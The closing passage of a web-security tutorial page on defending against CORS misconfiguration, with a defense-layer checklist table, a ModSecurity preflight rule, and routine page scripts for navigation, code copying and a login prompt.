    <span class="code-string">"id:920002,phase:1,allow,msg:'CORS Preflight'"</span></code></pre>
        </div>

        <h3 class="subsection-title">Security Checklist Summary</h3>

        <div class="highlight-box">
          <table style="width: 100%; border-collapse: collapse;">
            <tr style="border-bottom: 1px solid var(--border-color);">
              <th style="padding: 0.75rem; text-align: left; color: var(--neon-green);">Defense Layer</th>
              <th style="padding: 0.75rem; text-align: left; color: var(--neon-purple);">Implementation</th>
              <th style="padding: 0.75rem; text-align: left; color: var(--text-secondary);">Priority</th>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Origin Validation</td>
              <td style="padding: 0.75rem;">Strict allowlist, exact match only</td>
              <td style="padding: 0.75rem;">Critical</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Credential Controls</td>
              <td style="padding: 0.75rem;">Never with wildcard origins</td>
              <td style="padding: 0.75rem;">Critical</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Method/Header Restriction</td>
              <td style="padding: 0.75rem;">Allow only required methods/headers</td>
              <td style="padding: 0.75rem;">High</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">CSRF Tokens</td>
              <td style="padding: 0.75rem;">Additional layer for state changes</td>
              <td style="padding: 0.75rem;">High</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Security Headers</td>
              <td style="padding: 0.75rem;">CSP, X-Frame-Options, HSTS</td>
              <td style="padding: 0.75rem;">Medium</td>
            </tr>
            <tr>
              <td style="padding: 0.75rem;">Monitoring</td>
              <td style="padding: 0.75rem;">Log violations, alert on anomalies</td>
              <td style="padding: 0.75rem;">Medium</td>
            </tr>
          </table>
        </div>

        <div class="diagram-container">
          <div class="diagram-label">🎬 Video: Implementing Defense in Depth for CORS</div>
          <div class="video-placeholder">
            <i>▶️</i><br>
            [Insert Video: Complete CORS protection implementation walkthrough]
          </div>
        </div>
      </div>

    </main>
  </div>

  <script>
  function toggleSidebar() {
    const sidebar = document.querySelector('.sidebar');
    sidebar.style.transform = sidebar.style.transform === 'translateX(0%)' ? 'translateX(-100%)' : 'translateX(0%)';
  }

  document.querySelectorAll('a[href^="#"]').forEach(anchor => {
    anchor.addEventListener('click', function(e) {
      e.preventDefault();
      const target = document.querySelector(this.getAttribute('href'));
      if (target) {
        target.scrollIntoView({
          behavior: 'smooth',
          block: 'start'
        });
      }
    });
  });

  function copyCode(btn) {
    const codeBlock = btn.closest('.code-block').querySelector('pre');
    const text = codeBlock.textContent;
    navigator.clipboard.writeText(text).then(() => {
      btn.textContent = '✅ Copied!';
      setTimeout(() => btn.textContent = '📋 Copy', 2000);
    });
  }
  </script>
  <?php if (!$isLoggedIn): ?>
  <script>
  window.addEventListener("load", function() {
    if (typeof LoginModal !== "undefined") {
      LoginModal.show();
    }
  });
  </script>
  <?php endif; ?>

</body>

</html>